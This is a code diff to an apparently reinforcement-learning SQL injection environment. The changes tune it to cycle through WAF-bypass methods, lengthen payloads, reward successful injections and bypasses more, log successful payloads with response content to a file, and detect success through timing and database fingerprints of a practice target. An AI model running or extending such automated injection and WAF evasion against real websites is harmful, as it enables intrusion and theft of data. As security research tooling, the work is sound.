@@ -93,10 +93,12 @@ class SQLiEnvironment:
 
         # Apply bypass if needed
         if should_bypass:
-            bypass_result = self.bypass_waf.apply_bypass_to_token(original_token)
-            bypass_info = bypass_result
-            if bypass_result['success']:
-                processed_token = bypass_result['bypassed']
+            for method in self.bypass_waf.get_available_methods():
+                bypass_result = self.bypass_waf.apply_bypass_to_token(original_token, method=method)
+                if bypass_result['success']:
+                    processed_token = bypass_result['bypassed']
+                    bypass_info = bypass_result
+                    break
 
         # Update payload by appending processed token
         if self.current_payload:
@@ -153,8 +155,8 @@ class SQLiEnvironment:
             'sqli_detected': self._detect_sqli_success(response),
             'error_detected': error_info['has_error'],
             'error_info': error_info,
-            'is_complete': len(self.current_payload) >= 200,  # Simple completion check
-            'is_full': len(self.current_payload) >= 200
+            'is_complete': len(self.current_payload) >= 500,  # Simple completion check
+            'is_full': len(self.current_payload) >= 500
         }
         
         # Store in history
@@ -166,6 +168,13 @@ class SQLiEnvironment:
             'info': info
         })
         
+        if info['sqli_detected']:
+            with open("sqli_success_log.txt", "a", encoding="utf-8") as f:
+                f.write(f"Payload: {self.current_payload}\n")
+                f.write(f"Bypass method: {info.get('bypass_method', 'None')}\n")
+                f.write(f"Response (preview): {response.get('content', '')[:1000]}\n")
+                f.write("="*60 + "\n")
+
         return self.current_state, reward, done, info
     
     def _build_injection_url(self, payload: str) -> str:
@@ -338,7 +347,7 @@ class SQLiEnvironment:
         
         # High reward for SQL injection success
         if self._detect_sqli_success(response):
-            return 1.0
+            return 2.0
         
         # Enhanced reward for SQL errors
         if error_info['has_error']:
@@ -350,6 +359,9 @@ class SQLiEnvironment:
             if error_info['table_names']:
                 base_reward += 0.2
             return min(base_reward, 0.9)
+            # Reward khi bypass thành công
+        if response.get('bypass_applied', False) and not response.get('is_blocked', False):
+            return 0.5
         
         # Negative rewards
         if status_code in [403, 406, 429, 501, 503]:
@@ -371,17 +383,22 @@ class SQLiEnvironment:
         response_time = response.get('response_time', 0)
         
         # Time-based detection
-        if response_time > 5.0:
+        if response_time > 4.5:
             return True
         
-        # Error-based patterns
+        # Extract data
         success_patterns = [
-            'zixem@localhost$', '8.0.36',
-            # 'mysql_fetch_array', 'mysql_num_rows', 'warning: mysql',
-            # 'ora-01756', 'ora-00933', 'warning: pg_', 'warning: oci_'
+            r"zixem@localhost$", r"8.0.36",
+            # r"root@localhost", r"information_schema", r"mysql_fetch_array",
+            # r"mysql_num_rows", r"flag\{.*?\}", r"ctf\{.*?\}",
+            # r"version\(", r"user\(", r"admin", r"select .* from", r"union select",
+            # r"table .* does not exist", r"column .* does not exist", r"8\.0\.\d+", r"5\.\d+\.\d+"
         ]
-        
-        return any(pattern in content for pattern in success_patterns)
+        for pattern in success_patterns:
+            if re.search(pattern, content, re.I):
+                return True
+
+        return False
     
     def _is_response_different(self, response: Dict[str, Any]) -> bool:
         """Check if response differs from baseline"""
